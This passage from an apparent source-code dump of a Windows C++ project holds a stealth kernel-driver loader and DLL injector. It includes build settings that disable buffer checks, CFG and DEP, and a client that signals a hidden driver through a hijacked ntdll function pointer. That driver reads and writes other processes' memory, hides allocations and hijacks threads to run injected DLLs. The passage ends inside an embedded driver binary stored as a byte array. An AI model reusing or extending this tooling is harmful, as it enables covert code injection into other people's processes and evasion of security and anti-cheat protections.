      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <WholeProgramOptimization>false</WholeProgramOptimization>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <FavorSizeOrSpeed>Neither</FavorSizeOrSpeed>
      <ExceptionHandling>Sync</ExceptionHandling>
      <DebugInformationFormat>None</DebugInformationFormat>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <InlineFunctionExpansion>Disabled</InlineFunctionExpansion>
      <Optimization>MaxSpeed</Optimization>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <AdditionalIncludeDirectories>$(ProjectDir)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <DataExecutionPrevention>false</DataExecutionPrevention>
      <ProgramDatabaseFile />
      <EnableUAC>true</EnableUAC>
      <AllowIsolation>true</AllowIsolation>
      <ManifestFile />
      <AdditionalDependencies>diaguids.lib;ntdll.lib;Crypt32.lib;ws2_32.lib;Wldap32.lib;advapi32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;ole32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`client/client.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="entry.cpp" />
    <ClCompile Include="pdb\pdb.hpp" />
    <ClCompile Include="pdb\md5.cpp" />
    <ClCompile Include="pdb\pdb.cpp" />
    <ClCompile Include="driver_mapper\memory_manager.cpp" />
    <ClCompile Include="driver_mapper\service_manager.cpp" />
    <ClCompile Include="driver_mapper\page_table_manager.cpp" />
    <ClCompile Include="driver_mapper\pe_parser.cpp" />
    <ClCompile Include="driver_mapper\trace_cleaner.cpp" />
    <ClCompile Include="driver_mapper\utils.cpp" />
    <ClCompile Include="driver_mapper\driver_mapper.cpp" />
    <ClCompile Include="inject\dll_mapper.cpp" />
    <ClCompile Include="driver\driver_manager.cpp" />
    <ClCompile Include="utils\window_manager.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="inject\dll_mapper.hpp" />
    <ClInclude Include="driver\driver_manager.hpp" />
    <ClInclude Include="lib\ia_32.h" />
    <ClInclude Include="utils\window_manager.hpp" />
    <ClInclude Include="driver\driver_shell.h" />
    <ClInclude Include="inject\dll_shell.h" />
    <ClInclude Include="pdb\md5.hpp" />
    <ClInclude Include="lib\cli.h" />
    <ClInclude Include="driver_mapper\memory_manager.hpp" />
    <ClInclude Include="driver_mapper\service_manager.hpp" />
    <ClInclude Include="driver_mapper\trace_cleaner.hpp" />
    <ClInclude Include="driver_mapper\page_table_manager.hpp" />
    <ClInclude Include="driver_mapper\pe_parser.hpp" />
    <ClInclude Include="driver_mapper\utils.hpp" />
    <ClInclude Include="driver_mapper\driver_mapper.hpp" />
    <ClInclude Include="utils\logging.h" />
  </ItemGroup>
</Project>
```

`client/driver/driver_manager.cpp`:

```cpp
#include "driver_manager.hpp"

auto driver_manager_t::initialize() -> bool {
  auto ntdll = LoadLibraryA("ntdll.dll");
  if (!ntdll) {
    return false;
  }

  syscall = reinterpret_cast<syscall_t>(
      GetProcAddress(ntdll, "NtConvertBetweenAuxiliaryCounterAndPerformanceCounter"));
  return syscall != nullptr;
}

auto driver_manager_t::unload() -> bool {
  unload_request data{};
  bool buffer = false;
  data.success = &buffer;

  send_driver_request(&data, request_codes::unload);

  return buffer;
}

auto driver_manager_t::get_module_base(std::uint32_t pid, const std::wstring& module_name)
    -> std::uintptr_t {
  base_request data{};
  data.pid = pid;
  data.handle = 0;
  std::copy(module_name.begin(), module_name.end(), data.name.begin());

  send_driver_request(&data, request_codes::base);
  return data.handle;
}

auto driver_manager_t::find_signature(std::uint32_t pid, const std::wstring& mod_name,
                                      const std::string& signature) -> std::uintptr_t {
  pattern_request data{};
  data.pid = pid;
  data.address = 0;
  std::copy(mod_name.begin(), mod_name.end(), data.mod_name.begin());
  std::copy(signature.begin(), signature.end(), data.signature.begin());

  send_driver_request(&data, request_codes::pattern);
  return data.address;
}

auto driver_manager_t::read_virtual_memory(std::uint32_t pid, std::uintptr_t address, void* buffer,
                                           std::size_t size) -> bool {
  read_request data{pid, address, buffer, size};
  send_driver_request(&data, request_codes::read);
  return data.success;
}

auto driver_manager_t::write_virtual_memory(std::uint32_t pid, std::uintptr_t address,
                                            const void* buffer, std::size_t size) -> bool {
  write_request data{pid, address, const_cast<void*>(buffer), size};
  send_driver_request(&data, request_codes::write);
  return data.success;
}

auto driver_manager_t::allocate_independent_pages(std::uint32_t local_pid, std::uint32_t target_pid,
                                                  std::uint32_t target_tid, std::size_t size,
                                                  memory_type mem_type, std::uint32_t alloc_mode)
    -> void* {
  allocate_independent_pages_request data{local_pid, target_pid, target_tid, nullptr,
                                          size,      mem_type,   alloc_mode};
  send_driver_request(&data, request_codes::allocate_independent_pages);
  return data.address;
}

auto driver_manager_t::execute_dll_via_thread(std::uint32_t local_pid, std::uint32_t target_pid,
                                              std::uint32_t target_tid, void* address,
                                              unsigned int entry_point, std::uint32_t alloc_mode)
    -> bool {
  execute_dll_via_thread_request data{local_pid, target_pid,  target_tid,
                                      address,   entry_point, alloc_mode};
  send_driver_request(&data, request_codes::execute_dll_entrypoint);
  return data.success;
}

auto driver_manager_t::execute_dll_via_thread_hijack(std::uint32_t local_pid,
                                                     std::uint32_t target_pid,
                                                     std::uint32_t target_tid, void* address,
                                                     unsigned int entry_point,
                                                     std::uint32_t alloc_mode) -> bool {
  execute_dll_via_thread_request data{local_pid, target_pid,  target_tid,
                                      address,   entry_point, alloc_mode};
  send_driver_request(&data, request_codes::thread_hijack);
  return data.success;
}

auto driver_manager_t::swap_context_to_hyperspace(std::uint32_t target_tid) -> bool {
  swap_context_request data{target_tid};
  send_driver_request(&data, request_codes::swap_context);
  return data.success;
}

auto driver_manager_t::restore_context(std::uint32_t target_tid) -> bool {
  swap_context_request data{target_tid};
  send_driver_request(&data, request_codes::restore_context);
  return data.success;
}

bool driver_manager_t::send_driver_request(void* data, request_codes code) {
  if (!data || code == request_codes::success || code == request_codes::unique) {
    return false;
  }

  request_data request{static_cast<std::uint32_t>(request_codes::unique), code, data};

  LARGE_INTEGER auxiliary_counter = {0};
  LARGE_INTEGER perf_counter = {0};

  auxiliary_counter.QuadPart = reinterpret_cast<std::int64_t>(&request);

  const auto result = syscall(1, &auxiliary_counter, &perf_counter, nullptr);

  return (result >= 0) &&
         perf_counter.QuadPart == static_cast<std::int64_t>(request_codes::success);
}

// global driver instance
std::unique_ptr<driver_manager_t> g_driver_manager = std::make_unique<driver_manager_t>();
```

`client/driver/driver_manager.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <array>
#include <cstdint>
#include <functional>
#include <memory>
#include <string>
class driver_manager_t {
public:
  driver_manager_t() = default;
  ~driver_manager_t() = default;

  enum memory_type {
    NORMAL_PAGE,
    LARGE_PAGE,
    HUGE_PAGE
  };

  enum alloc_mode {
    ALLOC_INSIDE_MAIN_MODULE,
    ALLOC_BETWEEN_LEGIT_MODULES,
    ALLOC_AT_LOW_ADDRESS,
    ALLOC_AT_HIGH_ADDRESS,
    ALLOC_AT_HYPERSPACE
  };

  [[nodiscard]] auto initialize() -> bool;

  [[nodiscard]] auto unload() -> bool;

  [[nodiscard]] auto get_module_base(std::uint32_t pid, const std::wstring& module_name)
      -> std::uintptr_t;

  [[nodiscard]] auto find_signature(std::uint32_t pid, const std::wstring& mod_name,
                                    const std::string& signature) -> std::uintptr_t;

  auto read_virtual_memory(std::uint32_t pid, std::uintptr_t address, void* buffer,
                           std::size_t size) -> bool;

  template <typename T>
  T read_virtual_memory(std::uint32_t pid, std::uintptr_t address) {
    T response{};
    read_virtual_memory(pid, address, &response, sizeof(T));
    return response;
  }

  auto write_virtual_memory(std::uint32_t pid, std::uintptr_t address, const void* buffer,
                            std::size_t size) -> bool;

  template <typename T>
  auto write_virtual_memory(std::uint32_t pid, std::uintptr_t address, const T& value) -> bool {
    return write_virtual_memory(pid, address, &value, sizeof(T));
  }

  [[nodiscard]] auto allocate_independent_pages(std::uint32_t local_pid, std::uint32_t target_pid,
                                                std::uint32_t target_tid, std::size_t size,
                                                memory_type mem_type, std::uint32_t alloc_mode)
      -> void*;

  [[nodiscard]] auto execute_dll_via_thread(std::uint32_t local_pid, std::uint32_t target_pid,
                                            std::uint32_t target_tid, void* address,
                                            unsigned int entry_point, std::uint32_t alloc_mode)
      -> bool;
  [[nodiscard]] auto execute_dll_via_thread_hijack(std::uint32_t local_pid,
                                                   std::uint32_t target_pid,
                                                   std::uint32_t target_tid, void* address,
                                                   unsigned int entry_point,
                                                   std::uint32_t alloc_mode) -> bool;

  auto swap_context_to_hyperspace(std::uint32_t target_tid) -> bool;

  auto restore_context(std::uint32_t target_tid) -> bool;

private:
  using syscall_t = NTSTATUS(__fastcall*)(uintptr_t, void*, void*, void*);
  syscall_t syscall = nullptr;

  enum class request_codes : std::uint32_t {
    base = 0x119,
    read = 0x129,
    write = 0x139,
    allocate = 0x149,
    pattern = 0x179,
    success = 0x91a,
    unique = 0x92b,
    unload = 0x93c,
    allocate_independent_pages = 0x101c,
    execute_dll_entrypoint = 0x102c,
    swap_context = 0x103c,
    restore_context = 0x104,
    thread_hijack = 0x105c,
  };

  struct unload_request {
    bool* success;
  };

  struct read_request {
    std::uint32_t pid;
    std::uintptr_t address;
    void* buffer;
    std::size_t size;
    bool success;
  };

  struct write_request {
    std::uint32_t pid;
    std::uintptr_t address;
    void* buffer;
    std::size_t size;
    bool success;
  };

  struct base_request {
    std::uint32_t pid;
    std::uintptr_t handle;
    std::array<wchar_t, 260> name;
  };

  struct allocate_independent_pages_request {
    std::uint32_t local_pid;
    std::uint32_t target_pid;
    std::uint32_t target_tid;
    void* address;
    std::size_t size;
    memory_type use_large_page;
    std::uint32_t alloc_mode;
  };

  struct execute_dll_via_thread_request {
    std::uint32_t local_pid;
    std::uint32_t target_pid;
    std::uint32_t target_tid;
    void* alloc_base;
    unsigned long entry_point;
    std::uint32_t alloc_mode;
    bool success;
  };

  struct swap_context_request {
    std::uint32_t target_tid;
    bool success;
  };

  struct pattern_request {
    std::int32_t pid;
    std::array<wchar_t, 260> mod_name;
    std::array<char, 260> signature;
    std::uintptr_t address;
  };

  struct request_data {
    std::uint32_t unique;
    request_codes code;
    void* data;
  };

  bool send_driver_request(void* data, request_codes code);
};

extern std::unique_ptr<driver_manager_t> g_driver_manager;
```

`client/driver/driver_shell.h`:

```h
#pragma once

unsigned char driver_shell[53760] = {
    0x4D, 0x5A, 0x78, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x24, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x04, 0x00,
    0x46, 0x9E, 0xD9, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00,
    0x0B, 0x02, 0x0E, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x1F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x04, 0x00, 0x00, 0x04, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x60, 0xA1, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x04, 0x00, 0x6C, 0x03, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xA0, 0x83, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x84, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x4C, 0x3F, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
    0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x68, 0xB2, 0x03, 0x00, 0x00, 0xE0, 0x00, 0x00,
    0x00, 0x06, 0x00, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x6C, 0x03, 0x00, 0x00, 0x00, 0xA0, 0x04, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xCE, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xC8, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xAF, 0x00, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x08,
    0x73, 0x07, 0x31, 0xC9, 0xE9, 0x97, 0x00, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0xCA, 0x49, 0x83, 0xF8,
    0x20, 0x73, 0x04, 0x31, 0xC9, 0xEB, 0x4A, 0x4C, 0x89, 0xC1, 0x48, 0x83, 0xE1, 0xE0, 0x66, 0x41,
    0x0F, 0x6E, 0xC1, 0x66, 0x0F, 0x60, 0xC0, 0xF2, 0x0F, 0x70, 0xC0, 0x00, 0x66, 0x0F, 0x70, 0xC0,
    0x00, 0x45, 0x31, 0xD2, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF3, 0x42, 0x0F, 0x7F, 0x04, 0x10, 0xF3, 0x42, 0x0F, 0x7F, 0x44, 0x10, 0x10, 0x49, 0x83, 0xC2,
    0x20, 0x4C, 0x39, 0xD1, 0x75, 0xEA, 0x4C, 0x39, 0xC1, 0x74, 0x50, 0x41, 0xF6, 0xC0, 0x18, 0x74,
    0x3F, 0x49, 0x89, 0xCA, 0x4C, 0x89, 0xC1, 0x48, 0x83, 0xE1, 0xF8, 0x66, 0x41, 0x0F, 0x6E, 0xC1,
    0x66, 0x0F, 0x60, 0xC0, 0xF2, 0x0F, 0x70, 0xC0, 0x00, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
    0x66, 0x42, 0x0F, 0xD6, 0x04, 0x10, 0x49, 0x83, 0xC2, 0x08, 0x4C, 0x39, 0xD1, 0x75, 0xF1, 0x4C,
    0x39, 0xC1, 0x74, 0x17, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x88, 0x14, 0x08, 0x48, 0xFF, 0xC1, 0x49, 0x39, 0xC8, 0x75, 0xF5, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0x77, 0xD3, 0x00,
    0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x05, 0x7D, 0xD3, 0x00, 0x00, 0x66, 0xC7, 0x44, 0x24, 0x32,
    0xFF, 0x25, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x38, 0xC7,
    0x44, 0x24, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x62, 0xD3, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x90, 0xBB, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x2C, 0x41, 0xB9, 0x05, 0x00, 0x00, 0x00,
    0xE8, 0x3B, 0x69, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xB1, 0x00, 0x00, 0x00, 0x8B, 0x54,
    0x24, 0x2C, 0x41, 0xB8, 0x0E, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0xE8, 0xA0, 0x67, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x54, 0x24,
    0x32, 0x41, 0xB8, 0x0E, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0xFF, 0x15, 0xB0, 0xD5, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0xF3, 0xAB, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC6, 0xC0, 0x00, 0x00, 0x48, 0x8D,
    0x1D, 0x39, 0xB0, 0x00, 0x00, 0x49, 0x89, 0xD8, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0x87, 0xD5, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0x99, 0x98, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAF, 0xC0, 0x00, 0x00, 0x49,
    0x89, 0xD8, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x6D, 0xD5, 0x00, 0x00, 0x31, 0xF6, 0xBA, 0x0E, 0x00,
    0x00, 0x00, 0x48, 0x89, 0xF9, 0x45, 0x31, 0xC0, 0xE8, 0x43, 0x69, 0x00, 0x00, 0x84, 0xC0, 0x74,
    0x40, 0x48, 0x8B, 0x05, 0xA0, 0xD2, 0x00, 0x00, 0x48, 0x89, 0x38, 0x48, 0x89, 0x3D, 0x9E, 0xD2,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0xE3, 0x91, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x64, 0xC0, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xD7, 0xAF, 0x00, 0x00, 0xFF, 0x15, 0x2B, 0xD5, 0x00, 0x00, 0xEB, 0x32, 0x48,
    0x8D, 0x0D, 0xF7, 0xAE, 0x00, 0x00, 0xEB, 0x10, 0x48, 0x8D, 0x0D, 0x49, 0xAE, 0x00, 0x00, 0xEB,
    0x07, 0x48, 0x8D, 0x0D, 0xC4, 0xA2, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2F, 0xC0, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0xA8, 0xAF, 0x00, 0x00, 0xFF, 0x15, 0xFC, 0xD4, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00,
    0xC0, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x48,
    0xFF, 0x15, 0x42, 0xD3, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x27, 0x01, 0x00, 0x00, 0x48,
    0x89, 0xC6, 0x49, 0xC7, 0xC4, 0xFF, 0xFF, 0xFF, 0xFF, 0x31, 0xFF, 0x4C, 0x8D, 0x35, 0xEC, 0xBF,
    0x00, 0x00, 0x4C, 0x8D, 0x3D, 0x92, 0xA6, 0x00, 0x00, 0x45, 0x31, 0xED, 0xEB, 0x53, 0x66, 0x90,
    0x48, 0x85, 0xC9, 0x74, 0x67, 0x48, 0x89, 0xC5, 0x48, 0xC1, 0xFD, 0x0C, 0x48, 0x8D, 0x1C, 0x08,
    0x48, 0xFF, 0xCB, 0x48, 0x89, 0x5C, 0x24, 0x38, 0x48, 0xC1, 0xFB, 0x0C, 0x48, 0x89, 0x44, 0x24,
    0x30, 0x48, 0x89, 0x6C, 0x24, 0x20, 0x48, 0x89, 0x5C, 0x24, 0x28, 0x48, 0x8D, 0x0D, 0x27, 0xC9,
    0x00, 0x00, 0x4C, 0x89, 0xF2, 0x4D, 0x89, 0xF8, 0x41, 0x89, 0xF9, 0xFF, 0x15, 0x67, 0xD4, 0x00,
    0x00, 0x4C, 0x39, 0xE5, 0x4C, 0x0F, 0x42, 0xE5, 0x4C, 0x39, 0xEB, 0x4C, 0x0F, 0x47, 0xEB, 0xFF,
    0xC7, 0x89, 0xF9, 0x48, 0xC1, 0xE1, 0x04, 0x48, 0x8B, 0x04, 0x0E, 0x48, 0x8B, 0x4C, 0x0E, 0x08,
    0x48, 0x85, 0xC0, 0x74, 0x9B, 0x48, 0x85, 0xC9, 0x75, 0x9B, 0xEB, 0xE3, 0x4C, 0x89, 0x25, 0xC5,
    0xD2, 0x00, 0x00, 0x4C, 0x89, 0x2D, 0xB6, 0xD2, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x73, 0xC8, 0x00,
